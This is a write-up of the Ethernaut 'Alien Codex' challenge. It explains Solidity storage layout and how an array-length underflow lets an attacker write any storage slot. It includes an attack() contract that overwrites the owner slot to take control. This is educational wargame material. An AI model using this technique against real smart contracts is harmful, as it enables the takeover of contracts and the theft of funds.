# 19) Alien Codex

Success condition:
> You've uncovered an Alien contract. Claim ownership to complete the level.

Once again, we need to claim ownership of a contract by changing the `owner` variable. Since our contract inherit `Ownable`, it will have an owner variable. This variable will be store in slot 0. AlienCodex variables are then store, since and address and a bool can share a 32 bytes slot, there are packed together so we end up with owner and bool in slot 0, followed by the dynamic array variable. the first available slot store the length of the dynamic array. The value of the array are store at address = keccak256(slot#) + (index * elementSize) => keccak256(1) + i.

Now let's talk about the vulnerability:
```
function retract() public contacted {
    codex.length--;
}
```
This function reduce the length of the array by 1. After initialization of the contract, the length is zero so calling this function will cause an underflow and set a new length of 2^256. This is the maximum amount of storage slot available to a contract and since the element of the array are of 32 bytes length, we can now access any slot of our contract storage and modify it with this function:
```
function revise(uint256 i, bytes32 _content) public contacted {
    codex[i] = _content;
}
```
So we just need to figure out which i corresponds to slot0 and we can change the owner of the contract. 
We know that at slot keccak(1) will be stored codex[0]
at slot keccak(1) + 1 will be stored codex[1]
at slot keccak(1) + i will be stored codex[i]
at slot 2^256 -1 will be stored codex[2^256 -1 -keccak(1)] and 
at slot 0 will be stored codex[2^256 -1 -keccak(1) +1]

So for i = 2^256 - keccak(1), and _content = our address, the `revise()` function will give us ownership of the contract. 

We can solve this level with a simple contract that will call the first two functions and then calculate the value of i we want to modify the owner variable:
```
function attack() public {
        AlienCodex(victim).make_contact();  // to pass the contacted modifier
        AlienCodex(victim).retract();  // create the underflow

        uint256 keccak_1 = uint256(keccak256(abi.encode(1)));
        uint256 i = 2**256 - 1 - keccak_1 + 1; // have to do -1 +1 to avoid TypeErrors
        AlienCodex(victim).revise(i, bytes32(uint256(msg.sender)));
    }
```

---

### Storage with inheritance
As we already saw, in solidity variable are store sequentially starting at slot 0 up to slot 2^256, packed together if possible in 32 bytes slot. When a contract inherit another, it also inherit its variables, and they are stored before the variable of the contract starting at the first contract inherited. The contract variables are then store in the following slots.

### Storage of dynamic type
For the type of a variable is dynamic, (e.g. dynamic array, mapping) the slot is use for the length of left empty and the value are store at addresses based on the keccak hash of the slot (keccak256(slot#) + (index * elementSize) for arrays, keccak256(key, slot#) for mappings))

---
## Level completed!

This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of 2^256. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://weka.medium.com/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)